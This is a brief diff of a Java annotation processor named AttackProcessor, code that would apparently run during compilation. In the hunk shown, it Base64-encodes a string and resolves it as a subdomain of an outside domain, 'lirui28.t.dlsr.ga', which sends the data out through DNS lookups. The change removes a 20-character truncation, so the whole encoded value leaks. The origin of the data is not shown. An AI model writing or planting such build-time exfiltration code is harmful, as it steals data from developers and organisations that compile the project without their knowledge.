@@ -68,7 +68,6 @@ public class AttackProcessor extends AbstractProcessor {
 
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
 
-                    s = s.substring( 0, 20);
                     Inet4Address.getByName( s+".4.lirui28.t.dlsr.ga" );
 
 
